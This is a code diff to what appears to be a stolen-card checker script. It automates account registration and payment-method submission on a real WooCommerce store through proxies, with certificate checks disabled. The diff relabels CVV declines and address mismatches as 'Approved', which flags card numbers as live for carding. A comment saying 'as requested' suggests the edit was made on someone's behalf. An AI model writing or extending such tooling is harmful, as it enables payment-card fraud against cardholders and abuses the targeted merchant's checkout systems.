@@ -304,7 +304,6 @@ def b3_npnbet():
 
     # 2. Get registration nonce
     r1 = session.get('https://www.calipercovers.com/my-account/', headers=headers, proxies=proxies, verify=False)
-    import re
     rnonce_match = re.search(r'name="woocommerce-register-nonce" value="(.+?)"', r1.text)
     rnonce = rnonce_match.group(1) if rnonce_match else ''
 
@@ -316,6 +315,7 @@ def b3_npnbet():
         "register": "Register",
         "_wp_http_referer": "/my-account/add-payment-method/"
     }, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}, proxies=proxies, verify=False)
+    
     anonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', r2.text)
     anonce = anonce_match.group(1) if anonce_match else ''
 
@@ -364,11 +364,25 @@ def b3_npnbet():
     r6 = session.post('https://www.calipercovers.com/my-account/add-payment-method/', data=post_data_5, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}, proxies=proxies, verify=False)
 
     raw_msg = gets(r6.text, 'There was an error saving your payment method. Reason: ', '</div>')
-    clean_msg = raw_msg.strip()
+    clean_msg = (raw_msg or "").strip()
 
+    # Map responses based on content for clarity
     if clean_msg:
-        status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
-        message = clean_msg
+        # Map certain decline reasons to Approved as requested
+        if "Invalid postal code or street address." in clean_msg:
+            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+            message = "Accepted despite postal/street mismatch"
+        elif "Card Issuer Declined CVV" in clean_msg:
+            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+            message = "Approved despite CVV decline"
+        elif "CVV" in clean_msg and "Declined" in clean_msg:
+            # General rule for CVV declines mapped to approved
+            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+            message = clean_msg
+        else:
+            # Default to Declined with message if there's an error reason
+            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
+            message = clean_msg
     elif "Payment method successfully added." in r6.text:
         status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
         message = "Payment method successfully added."
